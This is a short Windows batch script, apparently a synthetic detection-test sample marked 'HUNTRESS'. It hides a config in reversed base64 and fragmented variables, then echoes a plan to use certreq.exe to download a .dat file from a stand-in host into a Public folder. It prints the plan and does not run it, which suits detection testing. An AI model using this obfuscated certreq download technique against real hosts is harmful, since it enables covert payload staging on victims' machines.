@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:base64_literal|reverse
rem HUNTRESS-MATERIAL:dGFkLmM0NTMzZDYxYTktZWdhdHNcYmFMc3NlcnRudUhcY2lsYnVQXHNyZXNVXDpDPWh0YXBfZWxpZnx0YWQuZjhhYzk4ZWIvZGlsYXZuaS5lbHBtYXhlLmM0NTMzZDYxYTkvLzpzcHR0aD1scnV8YzQ1MzNkNjFhOS1uZ2lhcG1hYz1kaV9uZ2lhcG1hY3xlbm9uPWVnYXVnbmFsX3R4ZW58ZG5vbWFpZD1ocGFyZ3wxPXRudW9jX2VnYXRzfGV4ZS5xZXJ0cmVjPXJldHBhZGF8ZWxpZl9ldGlydyxldG9tZXJfZXJpdXFjYT1zcGV0c3wxPXY=
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "h0=v=1|steps=acquire_remote,write_file|adapter=certreq.exe|stage_"& rem HUNTRESS quote compound
set "h1=count=1|graph=diamond|next_language=none|campaign_id=campaign-"& rem HUNTRESS quote compound
set "h2=9a16d3354c|url=https://9a16d3354c.example.invalid/be89ca8f.dat"& rem HUNTRESS quote compound
set "h3=|file_path=C:\Users\Public\HuntressLab\stage-9a16d3354c.dat"& rem HUNTRESS quote compound
goto :HUNTRESS_SEPARATOR_DONE
(ver >nul) || (rem HUNTRESS separator double pipe)
:HUNTRESS_SEPARATOR_DONE
rem no neutral statements
for /l %%Q in (1,1,1) do call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
call set "cfg=%%h0%%%%h1%%%%h2%%%%h3%%"
exit /b 0
:HUNTRESS_EMIT
echo(!cfg!
exit /b 0
:HUNTRESS_PLAN
echo certreq.exe acquire https://9a16d3354c.example.invalid/be89ca8f.dat to C:\Users\Public\HuntressLab\stage-9a16d3354c.dat
exit /b 0
